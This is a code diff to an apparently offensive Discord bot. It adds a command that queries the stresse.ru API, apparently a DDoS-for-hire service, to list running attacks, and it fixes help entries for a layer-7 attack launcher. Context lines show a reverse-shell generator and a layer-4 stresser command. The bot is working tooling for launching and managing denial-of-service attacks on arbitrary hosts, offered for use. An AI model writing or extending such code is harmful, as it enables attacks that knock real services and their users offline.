@@ -105,8 +105,9 @@ async def h(ctx):
     embed2.add_field(name='.vtSampleDownload', value="Downloads a given sample from virus total (I don't have an API key that can do this feature)", inline=False)
     embed2.add_field(name='.dnsDumpster', value='Use dnsDumpster unoficiall api', inline=True)
     embed2.add_field(name='.shodanSearch', value='Use shodan to find IOT Device IPs', inline=True)
-    embed2.add_field(name='.nmapPortScan' value='Run an NMAP Port scan', inline=True)
-    embed2.add_field(name='.launch_layer7_attack' value='Example: <api_key> <host> <port> <time> <method> (Methods: AUTOMATION, BYPASS, SOCKET, SPAMMER, BYPASS, ELITE)', inline=True)
+    embed2.add_field(name='.nmapPortScan', value='Run an NMAP Port scan', inline=True)
+    embed2.add_field(name='.launch_layer7_attack', value='Example: <api_key> <host> <port> <time> <method> (Methods: AUTOMATION, BYPASS, SOCKET, SPAMMER, BYPASS, ELITE)', inline=True)
+    embed2.add_field(name='.get_running_attacks', value='Get list of running DDoS Attacks')
     await ctx.send(embed=embed2)
 
 
@@ -219,6 +220,31 @@ async def genShellPy(ctx, ip=None, port=None):
         await ctx.send('Please enter a port!')
 
     await ctx.send(pyBeginning + pyShell)
+
+@bot.command()
+async def get_running_attacks(ctx):
+    api_url = "https://stresse.ru/api/api.php"
+    api_key = "YOUR_API_KEY"  # Replace with your API key
+    action = "running"
+
+    params = {
+        "key": api_key,
+        "action": action
+    }
+
+    try:
+        response = requests.get(api_url, params=params)
+        if response.status_code == 200:
+            json_response = response.json()
+            if json_response.get("status"):
+                attacks = json_response.get("body")
+                await ctx.send(f"Running Attacks:\n{attacks}")
+            else:
+                await ctx.send("API request was not successful.")
+        else:
+            await ctx.send(f"API request failed with status code: {response.status_code}")
+    except Exception as e:
+        await ctx.send(f"An error occurred: {str(e)}")
 
 @bot.command()
 async def stresse_layer4(ctx, api_key, host, port, time, method):
